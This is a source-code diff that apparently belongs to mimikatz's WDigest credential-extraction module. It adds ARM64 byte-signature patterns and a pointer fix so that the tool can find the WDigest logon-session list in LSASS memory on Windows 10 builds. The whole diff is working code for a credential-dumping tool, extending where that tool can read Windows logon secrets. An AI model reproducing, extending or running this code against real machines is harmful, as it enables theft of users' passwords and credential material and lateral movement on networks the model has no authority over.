@@ -4,7 +4,12 @@
 	Licence : https://creativecommons.org/licenses/by/4.0/
 */
 #include "kuhl_m_sekurlsa_wdigest.h"
-#ifdef _M_X64
+#if defined(_M_ARM64)
+BYTE PTRN_WIN6_PasswdSet[] = { 0xc4, 0x22, 0x40, 0xb9, 0x8b, 0xa2, 0x00, 0x91, 0x28, 0x21, 0x40, 0xb9, 0x1f, 0x01, 0x04, 0x6b};
+KULL_M_PATCH_GENERIC WDigestReferences[] = {
+	{KULL_M_WIN_BUILD_10_1803,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-48, 8, 48}},
+};
+#elif defined(_M_X64)
 BYTE PTRN_WIN5_PasswdSet[]	= {0x48, 0x3b, 0xda, 0x74};
 BYTE PTRN_WIN6_PasswdSet[]	= {0x48, 0x3b, 0xd9, 0x74};
 KULL_M_PATCH_GENERIC WDigestReferences[] = {
@@ -12,7 +17,7 @@ KULL_M_PATCH_GENERIC WDigestReferences[] = {
 	{KULL_M_WIN_BUILD_2K3,		{sizeof(PTRN_WIN5_PasswdSet),	PTRN_WIN5_PasswdSet},	{0, NULL}, {-4, 48}},
 	{KULL_M_WIN_BUILD_VISTA,	{sizeof(PTRN_WIN6_PasswdSet),	PTRN_WIN6_PasswdSet},	{0, NULL}, {-4, 48}},
 };
-#elif defined _M_IX86
+#elif defined(_M_IX86)
 BYTE PTRN_WIN5_PasswdSet[]	= {0x74, 0x18, 0x8b, 0x4d, 0x08, 0x8b, 0x11};
 BYTE PTRN_WIN6_PasswdSet[]	= {0x74, 0x11, 0x8b, 0x0b, 0x39, 0x4e, 0x10};
 BYTE PTRN_WIN63_PasswdSet[]	= {0x74, 0x15, 0x8b, 0x0a, 0x39, 0x4e, 0x10};
@@ -43,9 +48,14 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_wdigest(IN PKIWI_BASIC_SECURIT
 {
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aLsassMemory = {NULL, pData->cLsass->hLsassMem};
 	SIZE_T taille;
+	BOOL wasNotInit = !kuhl_m_sekurlsa_wdigest_package.Module.isInit;
 	
 	if(kuhl_m_sekurlsa_wdigest_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(pData->cLsass, &kuhl_m_sekurlsa_wdigest_package.Module, WDigestReferences, ARRAYSIZE(WDigestReferences), (PVOID *) &l_LogSessList, NULL, NULL, &offsetWDigestPrimary))
 	{
+		#if defined(_M_ARM64)
+		if(wasNotInit)
+			l_LogSessList = (PKIWI_WDIGEST_LIST_ENTRY)((PBYTE)l_LogSessList + sizeof(RTL_CRITICAL_SECTION));
+		#endif
 		aLsassMemory.address = l_LogSessList;
 		taille = offsetWDigestPrimary + sizeof(KIWI_GENERIC_PRIMARY_CREDENTIAL);
 		if(aLsassMemory.address = kuhl_m_sekurlsa_utils_pFromLinkedListByLuid(&aLsassMemory, FIELD_OFFSET(KIWI_WDIGEST_LIST_ENTRY, LocallyUniqueIdentifier), pData->LogonId))
